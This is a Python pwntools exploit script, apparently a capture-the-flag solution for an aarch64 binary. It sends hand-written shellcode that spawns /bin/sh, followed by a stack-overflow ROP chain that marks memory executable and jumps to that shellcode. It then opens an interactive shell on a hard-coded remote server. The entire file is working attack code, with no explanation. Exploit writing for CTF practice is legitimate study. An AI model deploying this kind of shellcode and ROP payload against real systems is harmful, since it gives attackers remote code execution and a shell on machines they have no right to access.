#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./pwn"
elf=ELF(pwn_file)
libc=ELF("./bc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=remote("127.1",20001)
else:
    r=remote("106.75.126.171",33865)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

code="""
    mov    x8, SYS_execve
    mov    x2, xzr           // NULL
    mov    x1, xzr           // NULL
    BL    here
    .ascii "/bin/sh"
    .byte 0x0 
here:
    mov    x0,x30
    svc    0
"""
import string
sh=asm(code,arch="aarch64")
r.sendafter("Name:",sh+p64(0x400860))
f={
        0:p64(0)+p64(1),
        0x10:p64(0x411068+len(sh))+p64(0x7),
        0x20:p64(0x1000)+p64(0x411000),
        0x30:p64(0x40f500)+p64(0x4007D4),
}
r.send("a"*0x48+p64(0x4008CC)+p64(0x40f500)+p64(0x4008AC)+fit(f)+"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRST"+p64(0x411068))
r.interactive()







